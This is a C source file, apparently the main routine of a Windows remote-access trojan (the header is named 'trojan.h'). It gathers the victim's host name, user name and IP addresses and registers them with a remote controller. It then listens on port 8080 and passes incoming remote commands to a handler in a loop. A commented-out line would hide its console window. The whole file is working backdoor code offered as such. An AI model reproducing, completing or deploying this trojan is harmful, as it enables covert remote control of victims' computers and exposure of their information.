/*
author: Forec
create_date: 2016-09-16
email: forec@bupt.edu.cn
*/

#include "trojan.h"

int main(int argc, char *argv[]){
	//ShowWindow(FindWindow("ConsoleWindowClass",argv[0]),0);   // hide window

	fd_set rfd;
	u_long ul = 1;
	struct timeval timeout;
	DWORD bufCharCount = 32767;

	char sendBuf[SEND_BUFLEN], recvBuf[RECV_BUFLEN], *pszAddr;
	char hostName[INFO_BUFLEN] = { 0 },
		 userName[INFO_BUFLEN] = { 0 },
		       ip[INFO_BUFLEN] = { 0 };

	/* init socket */
	int sockLen = sizeof(SOCKADDR);
	SOCKET sockServer, sockClient;
	SOCKADDR_IN addrServer, addrClient;
	WSADATA wsaData; 
	WORD wVersionRequested;

	FD_ZERO(&rfd);
	timeout.tv_sec = 3000;				// wait 3s
	timeout.tv_usec = 0;

	wVersionRequested = MAKEWORD(2, 2); // config windows socket
	while (true){						// loop until socket configured
		int err = WSAStartup(wVersionRequested, &wsaData);
		if (err != 0){
			continue;
		} else if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2){
			WSACleanup();
		} else
			break;
	}

	gethostname(hostName, bufCharCount);
	GetUserName((LPWSTR)userName, &bufCharCount);
	struct hostent *phostinfo = gethostbyname(hostName);
	for (int i = 0; phostinfo != NULL && phostinfo->h_addr_list[i] != NULL; i++){
		pszAddr = inet_ntoa(*(struct in_addr *)phostinfo->h_addr_list[i]);
		strcat_s(ip, INFO_BUFLEN, pszAddr);
	}

	sprintf_s(hostName, "%s\n%s\n%s", hostName, userName, ip);
	while (!registerIP(hostName));	// register host to remote client

	sockServer = socket(AF_INET, SOCK_STREAM, 0);// define socket
	addrServer.sin_addr.S_un.S_addr = inet_addr(pszAddr);
	addrServer.sin_family = AF_INET;
	addrServer.sin_port = htons(8080);

	bind(sockServer, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));
	listen(sockServer, 10);

	HINSTANCE hInstance;
	hInstance = GetModuleHandle(0);
	DWORD Tid;
	CreateThread(
		NULL,      
		0,          
		ThreadProc, 
		&hInstance, 
		0,          
		&Tid        
		);

	while (true){
		while (true){
			Sleep(1000);
			sockClient = accept(sockServer, (SOCKADDR *)&addrClient, &sockLen);
			if (sockClient != SOCKET_ERROR){
				send_s(sockClient, "200-success", strlen("200-success") + 1);
				FD_SET(sockClient, &rfd);
				break;
			}
		}

		while (true){
			Sleep(1000);
			if (FD_ISSET(sockClient, &rfd)){
				memset(recvBuf, 0, sizeof(recvBuf));
				int recvLen = recv(sockClient, recvBuf, RECV_BUFLEN, 0);
				if (recvLen == SOCKET_ERROR)
					break;
				dealWithCommand(sendBuf, recvBuf, recvLen, sockClient);
			}
		}
	}
	return 0;
}